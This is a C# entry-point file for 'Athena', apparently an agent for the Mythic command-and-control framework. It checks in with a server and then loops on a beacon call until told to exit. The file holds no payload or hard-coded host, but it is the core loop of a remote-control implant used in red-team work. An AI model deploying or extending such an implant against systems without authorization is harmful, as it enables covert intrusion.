using System;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Athena
{

    class Program
    {
        ///// <summary>
        ///// Main loop
        ///// </summary>
        //static void Main(string[] args)
        //{
        //    AsyncMain().GetAwaiter().GetResult();
        //}
        
        /// <summary>
        /// Main Loop (Async)
        /// </summary>
        static async Task Main() 
        { 
            //MythicClient controls all of the agent communications
            AthenaClient ac = new AthenaClient();

            if(!await ac.CheckIn())
            {
                Debug.WriteLine($"[{DateTime.Now}] Failed to update agent info, exiting.");
                Environment.Exit(0);
            }

            //Will need to add checkin to the initial client checkin
            while (!ac.exit)
            {
                await ac.profile.StartBeacon();
            }
        }
    }
}
